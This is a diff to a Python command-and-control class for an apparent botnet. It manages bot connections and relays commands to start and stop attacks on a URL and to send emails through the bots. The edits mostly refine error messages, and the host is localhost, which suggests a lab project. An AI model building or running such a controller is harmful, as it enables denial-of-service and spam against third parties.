@@ -69,7 +69,7 @@ class CnC:
                     self.__bots.pop(addr)
         return responses
 
-    def __bot_connection(self, stop: threading.Event):  # TODO make it a web server
+    def __bot_connection(self, stop: threading.Event):
 
         while not stop.is_set():
             try:
@@ -182,6 +182,8 @@ class CnC:
             code = responses.pop()
             if code == 403:
                 return "An attack is already going on."
+            if code == 400:
+                return f"Attack did not start because the url '{url}' is not reachable."
             if code != 200:
                 return "Attack did not start..."
         return "Attack started successfully!"
@@ -198,7 +200,7 @@ class CnC:
         codes = {r.status_code for r in responses.values()}
 
         if len(codes) == 1 and codes.pop() == 406:
-            return "There isn't any attack running"
+            return "There isn't any attack running."
         return "Attack stopped successfully!"
 
     def __email(self, files):
@@ -234,7 +236,7 @@ class CnC:
                 for address, port in self.__bots.items()
             }
         if len(responses) == 1 and responses.pop() != 200:
-            return "Emails were not sent..."
+            return "Emails were not sent due to an smtp server error, try again later."
         return "Emails sent successfully!"
 
     def __exit(self) -> str:
@@ -281,12 +283,11 @@ class CnC:
                     return "Too few arguments."
                 else:
                     return self.__cmds[cmd]['fun']()
-        except KeyError as e:
-            # print(e)
+        except KeyError:
             return "Command not recognized."
 
 
-HOST = '127.0.0.1'  #'10.0.2.15'
+HOST = '127.0.0.1'  # '10.0.2.15'
 PORT = 60000
 
 if __name__ == '__main__':
